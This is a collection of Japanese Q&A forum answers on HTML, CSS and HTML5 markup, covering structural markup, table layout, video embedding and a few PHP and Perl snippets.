作ったタグのファイルをファイル名が.htmlで終わるようにして保存します。そのファイルをダブルクリックしたら、ブラウザに表示されます。このダブルクリックすると表示するブラウザを設定するのが関連付けです。 今現在の設定（初期値）で問題なく関連付けられていると思います。IEではなく、firefoxなど標準準拠に近いブラウザでの確認制作、そして、問題の多いIEへの対応が、ホームページ作者としては、王道とは思いますが、とりあえず関連付けられているという意味では問題ありません。 次に、今あなたのハードディスクにあるそのファイルを忍者の指定された場所にアップします。ftpクライアントといわれるソフトを利用します。アップされれば、公開されることになります。 老婆心ながら、　http://homepage2.nifty.com/tomoarai/　のサイトは問題です。今日から現代日本語を勉強するのに、万葉仮名をまず小学生が教わるようなものです。今は正しくない手法の解説ページになっています。 もうすぐ出るhtml5では、<font>タグなどは廃止されます。現行html4では廃止までは行っていませんが非推奨とされています。いまから学ぶなら、そのサイトで学ぶのはお止めになったほうがいい。 勉強する人の好みもありますので、「正しい」今現行のhtml4が学べるサイトのリンクページをご紹介します。「正しい？」と思われたら、ページの上までスクロールして見てください。 ●正しい HTML・CSS を学べるページ内の 「正しい HTML を学べるサイト」 http://neo.s21.xrea.com/web/011.html#Shtml 上から順番に学ばなくても気に入った1つだけで結構です、が完璧に理解してください。 基本になります。いろいろ文字を変えたりしたいでしょうが、ぐっとがまんして、文章を構造化することを理解してください。その次にｃｓｓに進んでください。ｃｓｓでは装飾を思う存分お試しください。
画像へのリンクが横並びにあって、その下の枠内をリンクされるたびに横にスクロールすると言うことですね。 アルバムのリストと、その画像へのページ内リンクで構成されるページですから、HTMLは <body> ＿<h1>サンプル</h1> ＿<ul class="list"> ＿＿<li><a href="#p1">写真1</a></li> ＿＿<li><a href="#p2">写真2</a></li> ＿＿<li><a href="#p3">写真3</a></li> ＿＿<li><a href="#p4">写真4</a></li> ＿＿<li><a href="#p5">写真5</a></li> ＿</ul> ＿<ul class="album"> ＿＿<li id="p1"><img src="images/sample01.jpg" width="480" height="360"></li> ＿＿<li id="p2"><img src="images/sample02.jpg" width="480" height="360"></li> ＿＿<li id="p3"><img src="images/sample03.jpg" width="480" height="360"></li> ＿＿<li id="p4"><img src="images/sample04.jpg" width="480" height="360"></li> ＿＿<li id="p5"><img src="images/sample05.jpg" width="480" height="360"></li> ＿</ul> </body> になるでしょう。（タブは＿に置換してあります。） HTMLを作成するポイントは、文書構造を正しく記述することです。これはHTML5になれば極めて重要になります。 そうしておけば、先で画像へのリンクを左に置くことも、普通に縦に並べることも自由自在にデザインできます。 また、画像を下の枠の中だけで縦にスクロールさせることも・・・ その上で、スタイルシートで希望のものになるようにデザインしましょう。 なお、スクロールがゆっくりと動くようにするには、別途javascriptが必要です。
無料で広告小さいというと、忍者。 http://www.ninja.co.jp/hp/plan 上じゃなくて下部に表示、ほぼテキストのみ、と奥床しい。 PHPが使えるかどうかは知りません。
原因不明で投稿できなかったので、重複しますが・・ 　私もすでに19年になります。当時はHTML3.2の時代で第一次ブラウザ戦争( http://ja.wikipedia.org/wiki/%E3%83%96%E3%83%A9% … )の真っ盛りでしたから、それに振り回されることになります。 　元々、Netscae全盛の頃に始めていたため、HTMLの作成に翻弄されることになります。その一番の原因は、<font><center><MARQUEE>といったブラウザ独自の『見栄えに関わる要素』の扱いでした。 　まさにそのような時、WWWの創始者バーナズリーらによってW3Cが創設され最初のHTML4のワーキングドラフトが発表されました。そのコンセプトは『HTMLは文書構造を記述するものであって見栄えはスタイルシートに任せよう』でしたね。その後HTML4は破棄され 最終的に1999年にHTML4.01が勧告されました。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　<font>や<center><frame>が否定され始めて20年近くになるわけですから、いくらなんでも・・経験はおありなので、なぜこの情報が抜け落ちているかわかりませんが・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 【著者】 　・・・【中略】・・・ 　HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 HTML 4仕様が定める各DTDの詳細については バージョン情報(参照)の項を参照のこと。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.1 定義(HTML4.01仕様書邦訳)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より (参照) 　7.2 HTMLバージョン情報 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　ここには、ブラウザは後方互換のため、見栄えに関わる要素<font><center><frame>に対処しなければならないが、著者はそれらを用いないstrictで作成せよ！と明記してある。 「そのころはＣＳＳもありませんでした。」 　いいえ、スタイルシートは初期のブラウザの時代からありました。すくなくともHTML3の時代からはあったはずです。 「参考になる情報があれば教えてください。」 　もちろん仕様書を読まれれば、随所に書かれています。HTML4.01でも、特に ★2.2.1 HTMLの略歴 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★2.4 HTML 4による文書の著述 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) には詳しく書いてありますから、必ず目を通して置いてください。 　素案から20年、勧告から15年近く経過するわけですから、古い我々は知っているはずです。 「ＨＴＭＬ５ではその代わりはあるのでしょうか？参考になる情報があれば教えてください。」 　HTML5では、15年前の予告どおり、HTML4.01で予告されたほとんどすべての要素、属性が廃止されています。これらについては、 ★HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) を読めばわかります。HTML4.01strictを身につけていれば苦にならないはずです。 　簡潔に言うと「一切のプレゼンテーションに関わる要素・属性がなくなりました」「プレゼンテーションはスタイルシートに任せます」、その結果、HTMLは文書構造を記述するものに集約されます。 [HTML4strict} <body> 　<div class="header"> 　　<h1>見出し</h1> 　</div> 　<div class="section"> 　　<h2>見出し</h2> 　　<p>記事</p> 　　<div class="aside"> 　　　<div class="figure"></div> 　　</div> 　</div> 　<div class="footer"> 　</div> </div> と、内容・文書構造にしたがってテキストエディタで書いていた人にとっては、とても楽になります。これが [HTML5] <body> 　<header> 　　<h1>見出し</h1> 　</div> 　<section> 　　<h2>見出し</h2> 　　<p>記事</p> 　　<aside> 　　　<figure></div> 　　</aside> 　</section> 　<footer> 　</footer> </div> となるだけですから・・ 　しかし、オーサリングツールに頼っていた人は、一から覚えなおさないとなりません。オーサリングツールに文書を読み取って適切な要素を選ぶなんて出来ませんからね。 とりあえず、下記とリンク先を読めば概略は理解できるでしょう。 ★連載インデックス「HTML5“とか”アプリ開発入門」( http://www.atmarkit.co.jp/fwcr/design/index/inde … ) ★HTML5とは？変わるWebと注目の新要素 HTML5.0の情報サイト ( http://www.html5-guide.com/ ) に良くまとめられています。
公開の設定をされたものはwithPhotoサイト上などで閲覧ができます。 合言葉をつけた限定公開であれば、その合言葉を知っている人のみ、非公開の設定に なっていれば制作された本人しか見られません。
embed要素もしくはobject要素を使うとできます。 >自分のサイトにAVIファイルをアップしておりますが、 AVIファイルは重く、容量が大きいためWEBには適していません。 他の方が書かれている通り、WMVを使うと良いでしょう。 WMVとは WMVは、WEBに滴した動画ファイル形式。 サイズが最適化されている。 動画ファイルを公開するのはいいですが、ファイル形式によっては、プラグインが必要だということを 忘れずに！ 参考URL：http://www.tohoho-web.com/html/object.htm
＞iPadでアプリなどを使わずに 　パソコンだってアプリ(アドオン)を入れないと見れないのです。 　i-phone,i-paも当然安布里が必要です。flv,swfは、Flash独自のビデオフォーマット形式ですから無理なのです。 　flashは、adbeがライセンスを持つ閉ざされたソフトウェア--プロプライエタリ・ソフトウェア ( http://ja.wikipedia.org/wiki/%E3%83%97%E3%83%AD% … )です。HTML5は、プロプライエタリなソフトを使わず【製作】利用できるものでくみ上げることになっています。 　flasをアプリをいれずにi-padというのは二重の意味で出来ないのです。 　一番良いのは、HTML5のvideo仕様に変更する。もしくは、他の　aviなど動画形式にするかです。 例:簡単なものなら Google Swiffy ( http://www.google.com/doubleclick/studio/swiffy/ ) 　で変換できる ＊html5 video 変換 swf - Google 検索 ( http://www.google.co.jp/#sclient=psy-ab&hl=ja&so … ) 資料] ・video 要素 - html5doctor - HTML5.JP ( http://www.html5.jp/html5doctor/the-video-elemen … ) ・Flash なしでも HTML5 でここまで出来る « maclalala2 ( http://maclalala2.wordpress.com/2010/02/03/flash … ) 　i-padやi-phone--アップル--は、flashに本気で対応する気がありません。W3Cも、videoに進んでいます。特定のベンダーに握られてしまうことを避けています。調べればたくさん情報があります。
iframe閉じ忘れてました。 <iframe>ご利用中のユーザエージェントは、フレームに対応していないか、フレームを表示しないよう設定されているようです。こちらの <a href="foo.html">関連文書</A> を御覧ください。</iframe>ここから文章・・</p>
解決方法では無いのですが、昨年の秋頃から他のサイズでもテキスト広告の表示が一つだけになったりしてます、おそらくスマートフォン対策だと思います。 色々、アドセンスの設定をいじっても改善しませんでした。 参考URL：http://xn--2ckya6byeqbz988dujwa081b.com/love3.html
　DreamWeaverでは確かDOMツリーを表示する方法はないので、私はfirefoxをプレビューに使ってます。標準でDOM Inspectorがインストールされているはずなので、Ctrl+Shift+Iで表示されます。 　SeaMonkey.jp ( http://www.seamonkey.jp/ )なら、テキストエディタと併用できますが？？
こんにちは。 出来ないというのは何かエラーが出ていますか？ 特にエラーは出ていませんか？ 一応動作を確認して載せたソースです。 私の環境では検索できています。
右端に最低限のスペースを確保した上で、リキッドスタイルにしましょう。 ★リキッドデザインです。ウィンド巾を変えても常に右端にスペースが開きます。 タブは全角スペースに置換してあるので戻すこと <body> 　　<div class="article"> 　　　　<div class="header"> 　　　　　　<h1>サンプル</h1> 　　　　</div> 　　　　<div class="section"> 　　　　　　<h2>本文記事</h2> 　　　　</div> 　　　　<div class="footer"> 　　　　　　<h2>文書情報</h2> 　　　　　　<p class="goTop"><a href="./">トップへ</p> 　　　　</div> 　　</div> </body> html,body{margin:0;padding:0;} div.article{ 　　margin:0 4em 0 0;padding:0; } div.header,div.section,div.footer{ 　　width:90%; 　　margin:0 auto;padding:0; } div.footer p.goTop{ 　　width:5em; 　　position:fixed; 　　top:20px; 　　right:0; 　　line-height:1.6em; 　　text-align:center; } div.footer p.goTop a{ 　　text-decoration:none; 　　display:block; 　　border:ridge 3px red; } div.footer p.goTop a:hover{border-color:yellow;} div.footer p.goTop a:active{border-style:inset;background-color:silver;} /* サンプルのため */ div.header h1,div.section h2,div.footer h2{margin-top:0;} div.header{background-color:yellow;height:200px;} div.section{background-color:aqua;height:600px;} div.footer{background-color:lime;height:100px;} } <body> 　　<div class="article"> 　　　　<div class="header"> 　　　　　　<h1>サンプル</h1> 　　　　</div> 　　　　<div class="section"> 　　　　　　<h2>本文記事</h2> 　　　　</div> 　　　　<div class="footer"> 　　　　　　<h2>文書情報</h2> 　　　　　　<p class="goTop"><a href="./">トップへ</p> 　　　　</div> 　　</div> </body> ★HTML5の場合は、 <body> 　　<article> 　　　　<header> 　　　　　　<h1>サンプル</h1> 　　　　</header> 　　　　<section> 　　　　　　<h2>本文記事</h2> 　　　　</section> 　　　　<footer> 　　　　　　<h2>文書情報</h2> 　　　　　　<p class="goTop"><a href="./">トップへ</p> 　　　　</footer> 　　</article> </body> html,body{margin:0;padding:0;} article{ 　　margin:0 4em 0 0;padding:0; } header,section,footer{ 　　width:90%; 　　margin:0 auto;padding:0; } footer p.goTop{ 　　width:5em; 　　position:fixed; 　　top:20px; 　　right:0; 　　line-height:1.6em; 　　text-align:center; } footer p.goTop a{ 　　text-decoration:none; 　　display:block; 　　border:ridge 3px red; } footer p.goTop a:hover{border-color:yellow;} div.footer p.goTop a:active{border-style:inset;background-color:silver;} /* サンプルのため */ header h1,section h2,footer h2{margin-top:0;} header{background-color:yellow;height:200px;} section{background-color:aqua;height:600px;} footer{background-color:lime;height:100px;} }
余白うんぬんの話は、その貼り付けたソースとは別ですよね？ そのソースでは、パソコンのIE8でもクロームでも一切表示できませんでしたよ。 ですので、なんで余白ができるのか、というのが再現できないレベルです。 なので表題に対する回答は致しかねる、というか回答不可能です。 その他の質問である、添削について回答しますね。 HTMLの基本ルールが守られていません。 CSSも不要な数値やクラスもあります。 上から順に、ちょっとずつ書いていきますね。 a:hoverはマウスを乗せたときのデザイン指定ですが、 それを記述するなら、a:link、a:visited、a:activeもCSSで記述しましょう。 CSSで全部指定すると、bodyに要素で指定しているlinkとかvlinkとかalinkとか不要になります。 imgとかcssで指定してますけど、 そのhtml内で使ってませんよね。なのでimgのstyleは不要です。 背景色もCSSで記述しましょう。 テキストカラーもCSSで指定したほうがいいですね。 漠然としたcenterタグも使用しないほうがスマートです。CSSで行いましょう。 table内に何も文章が含まれていないのはなぜですか？ テーブルはそもそも表を表現するためのタグです。 色のついた余白的な飾りとして使うつもりなら、せめてdivを利用しましょう。 さらにそれが表だとしても、tr、td、tableに終了タグを忘れていますよ。 IE8でもクロームでも表示できない一番の原因は、 テーブルのマージンにマイナス表記を使ってることです。（ネガティブマージンといいます） マイナス数値が高すぎて、画面外にぶっとんでいるんです。 値を0に近づけるか、マイナスを取らないと表示できませんよ。 divを使うつもりだったら、CSSのクラスとIDをマスターして下さい。 divにalign=centerという組み合わせは昨今見た記憶が無いです。 fontタグを多用していますが、これも使わずに文字の装飾はCSSで行いましょう。 fontタグはそもそも推奨されないタグです。 また、そのhtmlソースだと、fontの終了タグが一つ足りませんし。 普通、開始タグがあれば、終了タグがあるんです。 開始タグだけで満足してると、色々なブラウザで表示がばらばらになります。 突っ込みどころが満載すぎて、ちょっと突っ込みきれないです。 何のために記述しているのかわからないコードだらけなので、 参考に正しいものを記述してあげる、ということすら難しい。 なので、今までのアドバイスだけで勘弁して下さい…。 HTMLの記述内にfontが使われているので、30代～50代の方でしょうか。 …て、私も30歳くらいですけどね。 昨今の指南書や初心者が勉強するサイトで、 fontを推奨することはまずあり得ないんです。廃止されましたし。 おそらく、質問者様がhtmlの勉強に触れたのは相当昔だと思われます。 とほほさんのサイトがもっともわかりやすく、比較的情報も新しめですので、 そこでみっちり画面とにらめっこして勉強してみて下さい。 HTMLも、CSSも、基本的なことは全て書いてありますので。 http://www.tohoho-web.com/www.htm 気になるサイトがあったら、 そのサイトのソースを開いて覗いてみる癖をつけましょう。 そうすると、どのタグがどんな意味で、 どのスタイルシートがどういう役割か、なんとなくわかってきます。
IEなどの独自仕様ですべてのブラウザに有効ではありませんが・ input[type=text],input[type=textarea]{ime-mode:active;} とか、属性値として、他にauto,inactive,disabledがあります。 javascriptを利用した方法は jQueryを使ったJavaScriptの書き方と、日本語入力モード制御の例 | JavaScript | murak.net ( http://murak.net/post/javascript/246 ) を参考に。
先の質問の時でも書きましたが、Web上のメディア再生はブラウザが対応するプラグインを利用します。 この場合、それぞれ個々の拡張子（あるいはMIMEタイプ）に対応したプラグインが呼び出されますが、 全部に一括対応するプラグインは存在しません。 つまり「共通のプレーヤー」はないのです。 また、embed要素は一部ブラウザの独自拡張機能なので（HTML4.01にこの項目はない） より汎用性の高いobject要素を用い、加えてembed要素も併記するのも良いでしょう。 AVI,MP4埋め込みに関しては、とほほさんの「HTMLリファレンス」などを参考にすると良いと思います。 http://www.tohoho-web.com/wwwmmdia.htm また、「AVI埋め込み」などで調べるとより具体的な記述例などが参照出来ると思います。
＞table または td に(データ)を表示させることはできますか？ HTML(大文字です)やJavaScriptでは行いません。 CGIを使います。 　 ＞table または td にページを表示させることはできますか？ 　ページの意味がわかりません。 　表でないものを、表では「なし」・・ 　iframeを使うことになるかと思います。
<h1>(見出しタグ)の中身は文字じゃなきゃいけないと誤解してるのかな。 単に<h1><img></h1>でOKですよ。もちろん<img>の中は省略しただけですのでちゃんとsrcやaltを記述してください。
私はPHPからのPDF生成は、fpdfの日本語対応版をよく使います。 Web上のフォームに入力してもらって、そのデータをｆｐｄｆに入れるだけでPDF生成してくれます。 ブラウザの違いよる印刷の崩れやはみ出しなども心配ないですし。 クラスライブラリを、requireできるディレクトリにおくだけで サーバー上でコンパイルしたりインストールする手間もいらないので、 サーバー問わずに使えて、結構便利です。 http://www.phpbook.jp/fpdf/
HTML以外のJavaScriptを使用しないと無理でしょうね。
「前の画面からPOST送信で送られた「＄start1」という変数が選択された状態にしたいとおもっている」という一文があるところから、画像は、そのデータを下に生成されたHTMLだと思われます。 （optionのエンドタグはoptionなので記述する＝閉じる必要はありません。） 　post(標準入力)だろうが、get(Querystrings)だろうが、いったん変数$start1に代入するところまでは出来ているとします。 　その後は配列@start1(1,2,3,4,5,6,7,8,9,10,11)の値をループして$start1を比較して一致すれば、<option selected>を、そうでなければ<option>を加えて、HTMLを書き出せばよいです。perlなら foreach(@start1){ 　if($start1==$_){print "<option selected>",$_;} 　else{print "<option",$_;} } 詳しくは、CGI ( http://oshiete.goo.ne.jp/category/251/ )
>px良いのですか？ 　要素の位置やサイズは、一般的には(相対サイズの)pxが良いでしょう。他の相対サイズのem,exはフォントサイズを参照します。 　また絶対サイズのmm,cm,in,pc,ptは、ページ媒体(印刷)に適しているでしょう。 　フォントの大きさは、用途によって使い分けます。 詳しくは ★4.3 値の種類（Values） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　とか
>どういう環境で学習することが一番よろしいでしょうか？ IDEを紹介して欲しいって事? >HTML5になれば、JQueryなどは不要になるでしょう。 HTML5になっても必要です。 HTML5になってもJavaScriptは需要があります。 でjQueryはJavaScriptを簡単に使うためのライブラリなのでHTML5になっても jQueryは需要があります。 特にHTML5ではタグの拡張だけでなくてAPIが拡張されているのでそれを使うのにJavaScriptを直接使うより jQueryなどのライブラリを使った方が楽に処理できるようになるでしょう。
1.アンケートとかで選択肢全部選び終わった 2.さて送信するか 3.間違って更新しちゃった 4.全部消えたあぁぁぁ＞＜ ってことがあったら嫌でしょ？ ブラウザにもよるだろうけど、Firefoxはformへの入力はできるだけ保持するようにしてるみたい。 絶対に希望通りの動作させたいなら、JavaScriptで制御すればよいと思う。
#4さんの御回答、ごもっともですね。便利にしたいなら金か工夫かが必要ですね。 とかWordPressのプラグインで　ネットラジオとかPodcast用というのがあれば、 一気に解決するからもしれないですが、以前探したときは ゴールデンなものが見つけられませんでした。 なお、補足なんですが、以前はネットラジオをストリーミング配信するには Webサーバー以外に、ストリーミングサーバー（WMとか、Realとか、QuickTimeとか）が 必要だったんですが、Flashでプログレッシブ再生っていうのができるようになってからは、 Webサーバー上にMP3ファイルを置くだけで、よくなったんで、 ストリーミングサーバーまでは、あんまり考える必要はないかなと、思います。
ブラウザのバグの気がします。 ・DOCTYPEを変えてみた ・baseタグをheadの先頭に置いてみた ・サイトルートじゃ無くて一つ下の階層に全部ずらしてみた ・postでなくgetにしてみた ・念のためにPHPでない言語を使ってみた どうやってもだめですね。 サーバーから送られてくるHTMLは同一なのに、直前に送信したデータに依存して動作が変わるというのはどう考えても変です。
否定的な回答が多いようですが、私は質問者さんの意見に賛成です。 そもそもhtmlは未だに不完全なものですし、不完全であることは有名な話です。従って現在のhtml仕様に合わない思想だからといって間違いというわけではありません。前の回答にもあったように、webとdtpは別ものですが、webはdtpの思想を土台にしています。美しいタイポグラフィや文字組はユーザーの理解とイメージの向上に働きます。webだけを見ている方々は特に、タイポや文字組の重要性、もしくはその存在すら知らずにweb仕様を口にする傾向があります。web上で洗練された文字組に出逢えないのは、必要ないからではなく、htmlやcssに機能が備わってない。つまりは単に不完全な状態だからです。 とは言え、私は私なりにフォントに最適なcssを設定します。 javascriptやphpを用いると、htmlやbodyタグにエージェント情報のクラスを設定することができます。 例えばiOSでアクセスした場合は、自動でclass="ios"が付加されます。そのクラスを用いるとエージェントごと、つまりはフォントごとにcssを設定することが可能です。この方法であれば特別にユーザビリティを低下させることもないはずです。 ちなみに現在開発中のwebkit2は縦書きに対応したりなど、いろいろと面白そうですよ。
遅くなりました。 あなたのスキルがわからないので、的確な回答になるかわかりませんが Google グループ ( https://groups.google.com/grphp?hl=ja&tab=wg ) を使うのが手っ取り早いです。 相当なスキルが必要ですが OpenPNE ( http://www.openpne.jp/ ) OpenPNE - Wikipedia ( http://ja.wikipedia.org/wiki/OpenPNE ) が良いかと思います。 [例] folomy ( http://folomy.jp/heart/ ) folomy - Wikipedia ( http://ja.wikipedia.org/wiki/Folomy )
javascriptを使わなければ、そうはならないはずですからjavascript側に問題があるかと・・
>添付画像 が見られないようですが・・・ >display:block; display:table-cell; じゃだめなんですか？
＞レイアウトを整えるのにはもってこいと思っていたのですが・・・ 　そのためのものではありません。「ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」は明確に、相当厳しい言葉で否定されています。 　どのようにHTMLを書くかは内容がわからないとわかりません(HTMLは文書構造を示すものですから)が、 <div id="listHTML"> ＿</ol> ＿＿<li><input type="button" value="1"/></li> ＿＿<li><input type="button" value="2"/></li> ＿＿<li><input type="button" value="3"/></li> ＿＿<li><input type="button" value="4"/></li> ＿＿<li><input type="button" value="5"/></li> ＿</ol> ＿<p> ＿＿<iframe> ＿</p> </div> でよいです。 ★HTMLを書くときにデザインを考えたら失敗します。
ウィンドウサイズやフォントサイズ、解像度などの差でしょう。 そもそも、HTMLは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より なのですから、自分ひとりが見るならともかく、ウェブに公開する限り、この基本中の基本だけは守らないと・ 　HTMLは文書構造をマークアップすることに専念し、きちんとマークアップされたHTMLをスタイルシートによって、PC用(ウィンドウ巾800～1600px)、i-phoneなどの640px、携帯電話の数百pxでも閲覧できるように作成すれば良いでしょう。そのためのHTMLでありスタイルシートなのですから。 2.4.1 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
torayoshiです。 一例に挙げた「JW FLV MEDIA PLAYER 4.1」を実際にダウンロードしてみると分かりますが、 インストールファイルもセットアップファイルもプレーヤーの実行ファイルもありません。 これでローカルのFLVはもちろん、他の形式の動画も見れません。 つまり「JW FLV MEDIA PLAYER 4.1」はメディアプレーヤーではないのです。 >サーバーにあるプレーヤーを指定して… 技術的には可能なんでしょうけど、もちろん私は知らないしまだ見たこともありません。 FLVの埋め込みはブラウザのプラグインを利用します。 Web上のFlash再生はブラウザの仕事なので、 ローカル上で作動するメディアプレーヤーの事は今回は頭から切り離してください。
まずHTMLから書き直します。HTMLは文書構造をマークアップするものですから、きちんとマークアップが出来ていれば、スタイルシートも簡単になります。 　ソースから判断すると、カレントのページのみサブメニューを表示することを考えているのだろうと思いますが、その場合でも各HTMLのごく一部だけ書き換えて済むようにしたいのでしたら、下記の様なHTMLで良いでしょう。 　liにcurrentのようなclass名をつけておくとスタイルシートは楽です。 　このようにHTMLができているとスタイルシートは十数行～数十行もあれば書けるはずです。 ＿<div class="nav"> ＿＿<ul> ＿＿＿<li class="left0"><a href="">タブ01</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="">サブ01</a></li> ＿＿＿＿＿<li><a href="">サブ02</a></li> ＿＿＿＿＿<li><a href="">サブ03</a></li> ＿＿＿＿＿<li><a href="">サブ04</a></li> ＿＿＿＿＿<li><a href="">サブ05</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li class="current left1"><a href="">タブ02</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="">サブ01</a></li> ＿＿＿＿＿<li><a href="">サブ02</a></li> ＿＿＿＿＿<li><a href="">サブ03</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li><a href="">タブ03</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="">サブ01</a></li> ＿＿＿＿＿<li><a href="">サブ02</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li left="3"><a href="">タブ04</a> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href="">サブ01</a></li> ＿＿＿＿＿<li><a href="">サブ02</a></li> ＿＿＿＿＿<li><a href="">サブ03</a></li> ＿＿＿＿＿<li><a href="">サブ04</a></li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li><a href="">タブ05</a></li> ＿＿＿<li><a href="">タブ06</a></li> ＿＿</ul> ＿</div>
HTMLタグでは連続した半角スペースは1文字として解釈されるけど、 掲示板のサーバー側のシステムで投稿された文章の連続したスペースを1つにしてしまう処理が行われている場合もあります。 ________a__________a と投稿し終わった文章がソースを表示して <p>________a__________a</p> となっているならHTMLの仕様で1つ文字になった。 ソースを見たら <p>_a_a</p>のように変化しているのなら、自動的に（無駄な）スペースが詰められています。 半角スペース1つでも1文字ですから、例え数文字分でも無駄なスペースは削除するようにして容量の削減を図っています。 どうしても半角スペースを連続させたいなら、以下の方法があります。 もっとも掲示板がこれらの利用を許可している場合だけどね。 許可されていなければ、そのまま表示されるか、受け付けないです。 <pre></pre>タグ。 そのままタグで括った内容をそっくりそのまま表示する。 （ノーブレイクスペース）。 実体参照で半角スペースを表す。 のように入力すれば、半角スペース3つ分のスペースを表示します。 ここの場合は、タグや実体参照を利用できないから、そのまま表示でされてしまいます。
http://www.vector.co.jp/vpack/filearea/win/net/h …
canvasは(Flow content,Phrasing content,Embedded content.Embedded content)で、sectioningやgroupingコンテントではない(HTML4.01で言うところのインライン要素な)ので、必ず<p>などで囲む必要があります。 　それはさておき、画像を含むdiv要素(pで良いと思いますが・・)にposition:absoluteが指定されていますから、指定されていないstaticな要素から独立して上に乗ります。 　canvasを、sectioningコンテントかgroupingコンテント(p,figure,aside,sectionなど)に入れて、それもabsoluteすると良いでしょう。その際、z-indexを使うならソース上の出現順位には関わらず、上下(前後)を指定できます。 　HTML5は、HTML4.01より文書構造をきちんとマークアップすることが求められます。まず、それをしっかり身につけないと、先に勧めませんよ。 <figure class="menue"> 　<p class="backImage"><img></p> 　<p class="overCanvas"><canvas></p> </figure> figure.manue{position:absolute;top:20px;left:20px;width:500px;height:500px;margin:0 auto;} figure.manue p.backImage{margin:0;} figure.menue p.overCanvas{position:absolute;top:0;left:0;}
cellspacingは、コマとコマの間隔を指定します。 borderは、コマ周囲の枠線(border)の太さを指定します。 cellpaddingは、枠線と内容の余白を指定します。 　詳しくは 11.3.3 コマのマージン ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　などを参照。 　なお、現在はtableのこれらの属性は指定せず、スタイルシートで指定することが主流です。スタイルシートを使うと、table全体の枠線の形と色、コマ間の上下左右の隙間、枠線の掲示用と色、内容との隙間が、上下左右別々に巾や色が指定できます。 　そのため、HTMLでは単純に <table border="1" summary="何たらの表"> 　<caption>表のタイトル</caption> 　<thead><!-- 省略可 --> 　　<tr> 　　　<th abbr="列１">列1</th> 　　　<th abbr="列１">列1</th> 　　　<th abbr="列１">列1</th> 　　</tr> 　<thead> 　<tfoot><!-- 省略可 --> 　　<tr> 　　　<th abbr="列１">列1</th> 　　　<th abbr="列１">列1</th> 　　　<th abbr="列１">列1</th> 　　</tr> 　</tfoot> 　<tbody> 　　<tr> 　　　<td rowspan="2">データ1</td> 　　　<th colspan="2">データ2</td> 　　</tr> 　　<tr> 　　　<td>データ3</td> 　　　<td>データ4</td> 　　</tr> 　</tbody> </table> 程度覚えておけば良いでしょう。 　なお、tableはあくまで表ですので、デザイン・配置のために使用するのは誤りです。 「単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「ページレイアウトの目的で表を用いる。・・・【中略】・・・こうしたテクニックによって、・・・【中略】・・・限られた環境にしか適応しなくなり、・・・【中略】・・・障害を持つ人々にアクセス障壁が設けられてしまう。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　など。
#1さんの通りで、セルを融合する <th rowspan="3">55555555555<br />X1<br />X9</th> というか、 下部のセルが全部同じなら、 <th>55555555555<br>X1<br>X9</th> いや、<td>55555555555<br>X1<br>X9</td> ----------------------------- もしくは、CSSで、 table,th,td{ border:1px gray solid;} tr.line3 th{ border-bottom-width:0;} tr.line4 th{ border-width:0 1px;} tr.line5 th{ border-top-width:0;} <table> <tr> <th colspan="8">11111111111</th> </tr> <tr> <th colspan="3">22222222222</th> <th colspan="3">33333333333</th> <th colspan="2">44444444444</th> </tr> <tr class="line3"> <th>55555555555</th> <th>66666666666</th> <th>77777777777</th> <th>88888888888</th> <th>99999999999</th> <th>aaaaaaaaaaa</th> <th>bbbbbbbbbbb</th> <th>ccccccccccc</th> </tr> <tr class="line4"> <th>X1</th> <th>X2</th> <th>X3</th> <th>X4</th> <th>X5</th> <th>X6</th> <th>X7</th> <th>X8</th> </tr> <tr class="line5"> <th>X9</th> <th>Xa</th> <th>Xb</th> <th>Xc</th> <th>Xd</th> <th>Xe</th> <th>Xf</th> <th>Xg</th> </tr> </table>
スタイルシート、CSSのwidth（幅）: の数値を つじつま（計算）が合うように変更 ---------------------- 全体枠が、 #my_body { width: 899px;} 左枠と中枠を囲っている枠が、 #wrapper { width: 702px;} 左枠が #my_navi_1 { width: 190px;} この左枠中身が、 dl.left_p { width: 190px;} 中枠が #my_contents { width: 505px;} 別途で右枠があって、 #my_navi_2 { width: 190px;} この右枠中身が、 dl.right_p { width: 190px;} ---------------------- 初心者なら設計図を書いた方が良いと思いますが、 それでも意味がわからなければ触らない方が良いです・・・ ※ 要バックアップ（初心者ほどバックアップすらしない法則）
